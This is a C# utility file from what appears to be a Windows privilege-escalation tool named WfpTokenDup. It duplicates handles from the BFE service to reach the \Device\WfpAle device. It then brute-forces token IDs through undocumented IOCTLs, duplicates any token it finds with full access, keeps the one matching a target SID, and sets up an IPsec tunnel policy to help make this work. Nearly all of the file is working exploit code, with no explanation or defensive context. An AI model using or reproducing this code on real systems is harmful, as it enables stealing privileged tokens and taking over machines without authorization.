using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using WfpTokenDup.Interop;

namespace WfpTokenDup.Library
{
    using NTSTATUS = Int32;

    internal class Utilities
    {
        public static IntPtr BruteForcingWfpToken(
            IntPtr hWfpAle,
            string targetSid,
            out LUID luid)
        {
            var hToken = IntPtr.Zero;
            luid = LUID.FromInt64(0);

            for (var luidSource = 0L; luidSource <= 0x1000L; luidSource++)
            {
                var tmpLuid = LUID.FromInt64(luidSource);
                IntPtr hObject = WfpGetRegisteredToken(hWfpAle, in tmpLuid);

                if (hObject == IntPtr.Zero)
                    continue;

                NTSTATUS ntstatus = NativeMethods.NtDuplicateObject(
                    new IntPtr(-1),
                    hObject,
                    new IntPtr(-1),
                    out IntPtr hDupObject,
                    ACCESS_MASK.TOKEN_ALL_ACCESS,
                    0u,
                    DUPLICATE_OPTION_FLAGS.NONE);
                NativeMethods.NtClose(hObject);

                if (ntstatus == Win32Consts.STATUS_SUCCESS)
                {
                    string tokenSid = Helpers.GetTokenUserSid(hDupObject);

                    if (Helpers.CompareIgnoreCase(tokenSid, targetSid))
                    {
                        luid = tmpLuid;
                        hToken = hDupObject;
                        break;
                    }
                    else
                    {
                        NativeMethods.NtClose(hDupObject);
                    }
                }
            }

            return hToken;
        }


        public static IntPtr DuplicateObjectHandle(int pid, IntPtr hObject)
        {
            var objectAttributes = new OBJECT_ATTRIBUTES();
            var clientId = new CLIENT_ID { UniqueProcess = new IntPtr(pid) };
            var hDupObject = IntPtr.Zero;

            NTSTATUS ntstatus = NativeMethods.NtOpenProcess(
                out IntPtr hProcess,
                ACCESS_MASK.PROCESS_DUP_HANDLE,
                in objectAttributes,
                in clientId);

            if (ntstatus == Win32Consts.STATUS_SUCCESS)
            {
                ntstatus = NativeMethods.NtDuplicateObject(
                    hProcess,
                    hObject,
                    new IntPtr(-1),
                    out hDupObject,
                    ACCESS_MASK.NO_ACCESS,
                    0u,
                    DUPLICATE_OPTION_FLAGS.SAME_ACCESS);

                if (ntstatus != Win32Consts.STATUS_SUCCESS)
                    hDupObject = IntPtr.Zero;

                NativeMethods.NtClose(hProcess);
            }

            return hDupObject;
        }


        public static bool EnableTokenPrivileges(
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            return EnableTokenPrivileges(
                WindowsIdentity.GetCurrent().Token,
                requiredPrivs,
                out adjustedPrivs);
        }


        public static bool EnableTokenPrivileges(
            IntPtr hToken,
            List<string> requiredPrivs,
            out Dictionary<string, bool> adjustedPrivs)
        {
            var allEnabled = true;
            adjustedPrivs = new Dictionary<string, bool>();

            do
            {
                if (requiredPrivs.Count == 0)
                    break;

                allEnabled = Helpers.GetTokenPrivileges(
                    hToken,
                    out Dictionary<string, SE_PRIVILEGE_ATTRIBUTES> availablePrivs);

                if (!allEnabled)
                    break;

                foreach (var priv in requiredPrivs)
                {
                    adjustedPrivs.Add(priv, false);

                    foreach (var available in availablePrivs)
                    {
                        if (Helpers.CompareIgnoreCase(available.Key, priv))
                        {
                            if ((available.Value & SE_PRIVILEGE_ATTRIBUTES.Enabled) != 0)
                            {
                                adjustedPrivs[priv] = true;
                            }
                            else
                            {
                                IntPtr pTokenPrivileges = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)));
                                var tokenPrivileges = new TOKEN_PRIVILEGES(1);

                                if (NativeMethods.LookupPrivilegeValue(
                                    null,
                                    priv,
                                    out tokenPrivileges.Privileges[0].Luid))
                                {
                                    tokenPrivileges.Privileges[0].Attributes = (int)SE_PRIVILEGE_ATTRIBUTES.Enabled;
                                    Marshal.StructureToPtr(tokenPrivileges, pTokenPrivileges, true);

                                    adjustedPrivs[priv] = NativeMethods.AdjustTokenPrivileges(
                                        hToken,
                                        false,
                                        pTokenPrivileges,
                                        Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)),
                                        IntPtr.Zero,
                                        out int _);
                                    adjustedPrivs[priv] = (adjustedPrivs[priv] && (Marshal.GetLastWin32Error() == 0));
                                }

                                Marshal.FreeHGlobal(pTokenPrivileges);
                            }

                            break;
                        }
                    }

                    if (!adjustedPrivs[priv])
                        allEnabled = false;
                }
            } while (false);

            return allEnabled;
        }


        public static IntPtr GetWfpAleHandle()
        {
            var hWfpAle = IntPtr.Zero;
            var typeIndex = Helpers.GetObjectTypeIndex("File");
            var pid = Helpers.GetServicePid("BFE");

            if ((typeIndex == -1) || (pid == -1))
                return IntPtr.Zero;

            if (Helpers.GetProcessHandles(pid, out List<SYSTEM_HANDLE_TABLE_ENTRY_INFO> handles))
            {
                foreach (var info in handles)
                {
                    string objectName = null;
                    var hObject = IntPtr.Zero;

                    if (info.ObjectTypeIndex == typeIndex)
                    {
                        hObject = DuplicateObjectHandle(pid, new IntPtr(info.HandleValue));

                        if (hObject != IntPtr.Zero)
                            objectName = Helpers.GetObjectName(hObject);
                    }

                    if ((hObject != IntPtr.Zero) && !string.IsNullOrEmpty(objectName))
                    {
                        if (Helpers.CompareIgnoreCase(objectName, @"\Device\WfpAle"))
                        {
                            hWfpAle = hObject;
                            break;
                        }
                    }

                    if (hObject != IntPtr.Zero)
                        NativeMethods.NtClose(hObject);
                }
            }

            return hWfpAle;
        }


        /*
         * Before using this function, WSAStartup API must be executed.
         * To uninstall registered policy, use FwpmIPsecTunnelDeleteByKey0 API
         */
        public static bool InstallIPSecPolicyIPv4(
            IntPtr hEngine,
            string policyName,
            in Guid providerKey,
            string localAddress,
            string remoteAddress,
            string presharedKey,
            out Guid newPolicyGuid)
        {
            bool status;
            var pConditions = IntPtr.Zero;
            var pAuthMethod = IntPtr.Zero;
            var pProposal = IntPtr.Zero;
            var pMainPolicy = IntPtr.Zero;
            var pQmTransform0 = IntPtr.Zero;
            var pQmSaTransform0 = IntPtr.Zero;
            var pIpsecProposals = IntPtr.Zero;
            var pTunnerlPolicy = IntPtr.Zero;
            IntPtr pPresharedKey = Marshal.StringToHGlobalUni(presharedKey);
            IntPtr pProviderKey = Marshal.AllocHGlobal(16);
            Helpers.WriteGuidToPointer(pProviderKey, in providerKey);
            newPolicyGuid = Guid.NewGuid();

            do
            {
                var localAddressUInt32 = 0u;
                var remoteAddressUInt32 = 0u;
                var nConditionUnit = Marshal.SizeOf(typeof(FWPM_FILTER_CONDITION0));

                status = Helpers.ConvertStringToSockAddr(localAddress, out SOCKADDR localSock);

                if (!status)
                    break;

                status = Helpers.ConvertStringToSockAddr(remoteAddress, out SOCKADDR remoteSock);

                if ((!status) || (localSock.sa_family != ADDRESS_FAMILY.AF_INET))
                    break;

                for (var idx = 0; idx < 4; idx++)
                {
                    localAddressUInt32 <<= 8;
                    remoteAddressUInt32 <<= 8;
                    localAddressUInt32 |= localSock.sa_data[2 + idx];
                    remoteAddressUInt32 |= remoteSock.sa_data[2 + idx];
                }

                /*
                 * FWPM_FILTER_CONDITION0[0]
                 */
                pConditions = Marshal.AllocHGlobal(nConditionUnit * 2);
                Helpers.ZeroMemory(pConditions, nConditionUnit * 2);
                Helpers.WriteGuidToPointer(
                    pConditions,
                    in Win32Consts.FWPM_CONDITION_IP_LOCAL_ADDRESS);
                Marshal.WriteInt32(pConditions, 0x10, (int)FWP_MATCH_TYPE.EQUAL);
                Marshal.WriteInt32(pConditions, 0x18, (int)FWP_DATA_TYPE.UINT32);
                Marshal.WriteInt32(pConditions, 0x20, (int)localAddressUInt32);

                /*
                 * FWPM_FILTER_CONDITION0[1]
                 */
                Helpers.WriteGuidToPointer(
                    pConditions,
                    nConditionUnit,
                    in Win32Consts.FWPM_CONDITION_IP_REMOTE_ADDRESS);
                Marshal.WriteInt32(pConditions, 0x10 + nConditionUnit, (int)FWP_MATCH_TYPE.EQUAL);
                Marshal.WriteInt32(pConditions, 0x18 + nConditionUnit, (int)FWP_DATA_TYPE.UINT32);
                Marshal.WriteInt32(pConditions, 0x20 + nConditionUnit, (int)remoteAddressUInt32);

                var authMethod = new IKEEXT_AUTHENTICATION_METHOD0
                {
                    authenticationMethodType = IKEEXT_AUTHENTICATION_METHOD_TYPE.IPRESHARED_KEY,
                    data = new IKEEXT_AUTHENTICATION_METHOD0_UNION
                    {
                        presharedKeyAuthentication = new IKEEXT_PRESHARED_KEY_AUTHENTICATION0
                        {
                            presharedKey = new FWP_BYTE_BLOB
                            {
                                Size = presharedKey.Length + 2,
                                Data = pPresharedKey
                            }
                        }
                    }
                };
                pAuthMethod = Marshal.AllocHGlobal(Marshal.SizeOf(authMethod));
                Marshal.StructureToPtr(authMethod, pAuthMethod, false);

                var proposal = new IKEEXT_PROPOSAL0
                {
                    cipherAlgorithm = new IKEEXT_CIPHER_ALGORITHM0
                    {
                        algoIdentifier = IKEEXT_CIPHER_TYPE.AES_128
                    },
                    integrityAlgorithm = new IKEEXT_INTEGRITY_ALGORITHM0
                    {
                        algoIdentifier = IKEEXT_INTEGRITY_TYPE.SHA1
                    },
                    maxLifetimeSeconds = 8 * 60 * 60,
                    dhGroup = IKEEXT_DH_GROUP.GROUP_2
                };
                pProposal = Marshal.AllocHGlobal(Marshal.SizeOf(proposal));
                Marshal.StructureToPtr(proposal, pProposal, false);

                var policy = new IKEEXT_POLICY0
                {
                    numAuthenticationMethods = 1,
                    authenticationMethods = pAuthMethod,
                    numIkeProposals = 1,
                    ikeProposals = pProposal
                };
                pMainPolicy = Marshal.AllocHGlobal(Marshal.SizeOf(policy));
                Marshal.StructureToPtr(policy, pMainPolicy, false);

                var mainContext = new FWPM_PROVIDER_CONTEXT0
                {
                    displayData = new FWPM_DISPLAY_DATA0 { name = policyName },
                    providerKey = pProviderKey,
                    providerData = new FWP_BYTE_BLOB(),
                    type = FWPM_PROVIDER_CONTEXT_TYPE.IPSEC_IKE_MM_CONTEXT,
                    data = new FWPM_PROVIDER_CONTEXT0_UNION
                    {
                        authIpMmPolicy = pMainPolicy
                    }
                };

                var qmTransform0 = new IPSEC_AUTH_AND_CIPHER_TRANSFORM0
                {
                    authTransform = new IPSEC_AUTH_TRANSFORM0
                    {
                        authTransformId = Win32Consts.IPSEC_AUTH_TRANSFORM_ID_HMAC_SHA_1_96
                    },
                    cipherTransform = new IPSEC_CIPHER_TRANSFORM0
                    {
                        cipherTransformId = Win32Consts.IPSEC_CIPHER_TRANSFORM_ID_AES_128
                    }
                };
                pQmTransform0 = Marshal.AllocHGlobal(Marshal.SizeOf(qmTransform0));
                Marshal.StructureToPtr(qmTransform0, pQmTransform0, false);

                var qmSaTransform0 = new IPSEC_SA_TRANSFORM0
                {
                    ipsecTransformType = IPSEC_TRANSFORM_TYPE.ESP_AUTH_AND_CIPHER,
                    data = new IPSEC_SA_TRANSFORM0_UNION
                    {
                        espAuthAndCipherTransform = pQmTransform0
                    }
                };
                pQmSaTransform0 = Marshal.AllocHGlobal(Marshal.SizeOf(qmSaTransform0));
                Marshal.StructureToPtr(qmSaTransform0, pQmSaTransform0, false);

                var ipsecProposals = new IPSEC_PROPOSAL0
                {
                    lifetime = new IPSEC_SA_LIFETIME0
                    {
                        lifetimeSeconds = 3600,
                        lifetimeKilobytes = 100000,
                        lifetimePackets = 0x7FFFFFFF
                    },
                    numSaTransforms = 1,
                    saTransforms = pQmSaTransform0
                };
                pIpsecProposals = Marshal.AllocHGlobal(Marshal.SizeOf(ipsecProposals));
                Marshal.StructureToPtr(ipsecProposals, pIpsecProposals, false);

                var tunnelPolicy = new IPSEC_TUNNEL_POLICY0_V4
                {
                    numIpsecProposals = 1,
                    ipsecProposals = pIpsecProposals,
                    tunnelEndpoints = new IPSEC_TUNNEL_ENDPOINTS0_V4
                    {
                        ipVersion = FWP_IP_VERSION.V4,
                        localV4Address = localAddressUInt32,
                        remoteV4Address = remoteAddressUInt32
                    },
                    saIdleTimeout = new IPSEC_SA_IDLE_TIMEOUT0
                    {
                        idleTimeoutSeconds = 300,
                        idleTimeoutSecondsFailOver = 60
                    }
                };
                pTunnerlPolicy = Marshal.AllocHGlobal(Marshal.SizeOf(tunnelPolicy));
                Marshal.StructureToPtr(tunnelPolicy, pTunnerlPolicy, false);

                var tunnelContext = new FWPM_PROVIDER_CONTEXT0
                {
                    providerContextKey = newPolicyGuid,
                    displayData = new FWPM_DISPLAY_DATA0 { name = policyName },
                    providerKey = pProviderKey,
                    providerData = new FWP_BYTE_BLOB(),
                    type = FWPM_PROVIDER_CONTEXT_TYPE.IPSEC_IKE_QM_TUNNEL_CONTEXT,
                    data = new FWPM_PROVIDER_CONTEXT0_UNION
                    {
                        ikeQmTunnelPolicy = pTunnerlPolicy
                    }
                };

                var nReturnedCode = NativeMethods.FwpmIPsecTunnelAdd0(
                    hEngine,
                    FWPM_TUNNEL_FLAGS.POINT_TO_POINT,
                    in mainContext,
                    in tunnelContext,
                    2u,
                    pConditions,
                    IntPtr.Zero);
                status = (nReturnedCode == 0);

                if (!status)
                    newPolicyGuid = new Guid();
            } while (false);

            if (pTunnerlPolicy != IntPtr.Zero)
                Marshal.FreeHGlobal(pTunnerlPolicy);

            if (pIpsecProposals != IntPtr.Zero)
                Marshal.FreeHGlobal(pIpsecProposals);

            if (pQmSaTransform0 != IntPtr.Zero)
                Marshal.FreeHGlobal(pQmSaTransform0);

            if (pQmTransform0 != IntPtr.Zero)
                Marshal.FreeHGlobal(pQmTransform0);

            if (pMainPolicy != IntPtr.Zero)
                Marshal.FreeHGlobal(pMainPolicy);

            if (pProposal != IntPtr.Zero)
                Marshal.FreeHGlobal(pProposal);

            if (pAuthMethod != IntPtr.Zero)
                Marshal.FreeHGlobal(pAuthMethod);

            if (pConditions != IntPtr.Zero)
                Marshal.FreeHGlobal(pConditions);

            Marshal.FreeHGlobal(pPresharedKey);

            return status;
        }


        public static IntPtr WfpGetRegisteredToken(IntPtr hWfpAle, in LUID luid)
        {
            NTSTATUS ntstatus;
            var hToken = IntPtr.Zero;
            IntPtr pInBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(LUID)));
            IntPtr pOutBuffer = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.StructureToPtr(luid, pOutBuffer, false);

            ntstatus = NativeMethods.NtDeviceIoControlFile(
                hWfpAle,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out IO_STATUS_BLOCK _,
                (uint)WFPALE_IOCTL_CODES.QueryTokenById,
                pInBuffer,
                (uint)Marshal.SizeOf(typeof(LUID)),
                pOutBuffer,
                (uint)IntPtr.Size);

            if (ntstatus == Win32Consts.STATUS_SUCCESS)
            {
                var hObject = Marshal.ReadIntPtr(pOutBuffer);
                ntstatus = NativeMethods.NtDuplicateObject(
                    new IntPtr(-1),
                    hObject,
                    new IntPtr(-1),
                    out IntPtr hDupObject,
                    ACCESS_MASK.TOKEN_ALL_ACCESS,
                    0u,
                    DUPLICATE_OPTION_FLAGS.NONE);
                NativeMethods.NtClose(hObject);

                if (ntstatus == Win32Consts.STATUS_SUCCESS)
                    hToken = hDupObject;
            }

            Marshal.FreeHGlobal(pInBuffer);
            Marshal.FreeHGlobal(pOutBuffer);

            return hToken;
        }


        public static bool WfpRegisterToken(IntPtr hWfpAle, int pid, IntPtr hToken, out LUID luid)
        {
            NTSTATUS ntstatus;
            var pInputBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WFP_TOKEN_INFORMATION)));
            var pOutputBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(LUID)));
            var info = new WFP_TOKEN_INFORMATION { Pid = new UIntPtr((uint)pid), Token = hToken };
            Marshal.StructureToPtr(info, pInputBuffer, false);

            ntstatus = NativeMethods.NtDeviceIoControlFile(
                hWfpAle,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out IO_STATUS_BLOCK _,
                (uint)WFPALE_IOCTL_CODES.ProcessTokenReference,
                pInputBuffer,
                (uint)Marshal.SizeOf(typeof(WFP_TOKEN_INFORMATION)),
                pOutputBuffer,
                (uint)Marshal.SizeOf(typeof(LUID)));

            if (ntstatus == Win32Consts.STATUS_SUCCESS)
                luid = LUID.FromInt64(Marshal.ReadInt64(pOutputBuffer));
            else
                luid = LUID.FromInt64(0L);

            Marshal.FreeHGlobal(pOutputBuffer);
            Marshal.FreeHGlobal(pInputBuffer);

            return (ntstatus == Win32Consts.STATUS_SUCCESS);
        }


        public static bool WfpUnregisterToken(IntPtr hWfpAle, in LUID luid)
        {
            NTSTATUS ntstatus;
            var pInputBuffer = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(LUID)));
            Marshal.StructureToPtr(luid, pInputBuffer, false);

            ntstatus = NativeMethods.NtDeviceIoControlFile(
                hWfpAle,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out IO_STATUS_BLOCK _,
                (uint)WFPALE_IOCTL_CODES.ReleaseTokenInformationById,
                pInputBuffer,
                (uint)Marshal.SizeOf(typeof(LUID)),
                IntPtr.Zero,
                0u);

            Marshal.FreeHGlobal(pInputBuffer);

            return (ntstatus == Win32Consts.STATUS_SUCCESS);
        }
    }
}
